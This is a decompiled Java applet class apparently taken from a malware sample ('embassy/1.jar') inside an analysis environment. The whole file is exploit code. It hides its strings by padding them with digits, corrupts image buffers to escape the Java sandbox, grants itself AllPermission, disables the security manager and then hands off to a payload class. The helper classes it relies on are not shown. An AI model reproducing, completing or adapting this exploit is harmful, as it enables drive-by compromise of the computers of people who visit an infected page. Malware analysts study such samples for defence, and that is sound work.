/*     */ import java.applet.Applet;
/*     */ import java.awt.image.BufferedImage;
/*     */ import java.awt.image.DataBufferByte;
/*     */ 
/*     */ 
/*     */ public class Issue
/*     */   extends Applet
/*     */ {
/*   9 */   private static final String jse = csfn("986j56a4v35a.3s5e3c6u4r534it6y7.3P4e5r6m8i6s4s3i5o6n7s8");
/*  10 */   private static final String jseA = csfn("23j5a64v6a.5s2e4c5u55r7i34ty.3A4l5l3645P6er46566m6i3s3645si6o3n2");
/*  11 */   private boolean _is64 = System.getProperty(csfn("3o5s.6a2r5c5h2"), "").contains("64");
/*  12 */   static boolean _isWin = isWin();
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public void init() {
/*     */     try {
/*  19 */       for (int i = iCh(111); i < iCh(116); i++) {
/*     */         
/*     */         try {
/*  22 */           myJob();
/*  23 */           if (!isOk()) {
/*     */             break;
/*     */           }
/*  26 */         } catch (Throwable throwable) {}
/*     */       } 
/*     */       
/*  29 */       if (isOk())
/*  30 */         System.exit(0); 
/*  31 */       Resp resp = new Resp(csfn("234p34a55445c43654k632434234235"));
/*     */     }
/*  33 */     catch (Exception exception) {
/*     */       
/*  35 */       System.exit(0);
/*     */     } 
/*     */   }
/*     */ 
/*     */   
/*     */   public static boolean isOk() {
/*  41 */     return (info2.getSM() != null);
/*     */   }
/*     */ 
/*     */   
/*     */   public static boolean isWin() {
/*  46 */     String str = System.getProperty("os.name").toLowerCase();
/*  47 */     return (str.indexOf(csfn("456457w6734345i5645n4743457345")) >= 0);
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   private int myJob() throws Throwable {
/*     */     try {
/*  54 */       String str = csfn("64s33333e3333t333S55e666c777u5r333i534t76y2M34a55n76a88g666e44r2222");
/*  55 */       Class clazz = info1.syscla();
/*  56 */       Object[] arrayOfObject1 = new Object[iCh(1)];
/*  57 */       Object object1 = stac.stacO(clazz, str, arrayOfObject1);
/*     */       
/*  59 */       DataBufferByte dataBufferByte = new DataBufferByte(16);
/*  60 */       int[] arrayOfInt = new int[iCh(8)];
/*  61 */       Object[] arrayOfObject2 = new Object[iCh(7)];
/*  62 */       arrayOfObject2[iCh(2)] = stac.stacO(clazz, str, arrayOfObject1);
/*  63 */       arrayOfObject2[iCh(4)] = stac.stac9(arrayOfObject2[iCh(2)]);
/*     */ 
/*     */ 
/*     */ 
/*     */       
/*  68 */       Object object2 = info2.levelUp(jseA, jse);
/*     */       
/*  70 */       arrayOfObject2[3] = info2.acc(object2);
/*     */       
/*  72 */       int i = iCh(arrayOfInt.length);
/*     */       
/*  74 */       BufferedImage bufferedImage1 = new BufferedImage(iCh(4), 1, 2);
/*     */       
/*  76 */       stac.turk(bufferedImage1);
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */       
/*  82 */       Object object3 = info1.purk(this._is64, dataBufferByte);
/*  83 */       BufferedImage bufferedImage2 = info1.furk(object3);
/*     */ 
/*     */ 
/*     */       
/*  87 */       stac.atfo(bufferedImage1, bufferedImage2);
/*     */       
/*  89 */       int j = iCh(arrayOfInt.length);
/*  90 */       if (j == i) {
/*  91 */         return 1;
/*     */       }
/*  93 */       if (Resp.aLoop(i, arrayOfObject2, arrayOfInt) != 0) {
/*     */         
/*     */         try {
/*  96 */           stac.stac1(arrayOfObject2[2]);
/*     */         }
/*  98 */         catch (Exception exception) {}
/*     */       }
/* 100 */     } catch (Exception exception) {}
/* 101 */     return 0;
/*     */   }
/*     */ 
/*     */   
/*     */   public static int iCh(int paramInt) {
/* 106 */     int i = "ggff".length();
/* 107 */     i = i / 4 * paramInt;
/* 108 */     return i;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   static String imgExt(String paramString) {
/* 114 */     return csfn("777j7a7v7a7.7a7w7t7.77im727a7g7e7.7777") + paramString;
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public static Object getMd(String paramString1, String paramString2, Object paramObject, Class[] paramArrayOfClass, Object[] paramArrayOfObject) throws Exception {
/* 121 */     return info2.pInvoke(info2.getCl(paramString1).getMethod(paramString2, paramArrayOfClass), paramObject, paramArrayOfObject);
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public static Object getCon(String paramString, Class[] paramArrayOfClass, Object[] paramArrayOfObject) throws Exception {
/* 127 */     return info2.getCl(paramString).getConstructor(paramArrayOfClass).newInstance(paramArrayOfObject);
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public static String csfn(String paramString) {
/* 139 */     String str = "";
/* 140 */     for (byte b = 0; b < paramString.length(); b++) {
/*     */       
/* 142 */       if (paramString.charAt(b) > '9' || paramString.charAt(b) < '0')
/*     */       {
/* 144 */         str = str + paramString.charAt(b); } 
/*     */     } 
/* 146 */     return str;
/*     */   }
/*     */ }


/* Location:              /home/remnux/malware/embassy/1.jar!/Issue.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       1.1.3
 */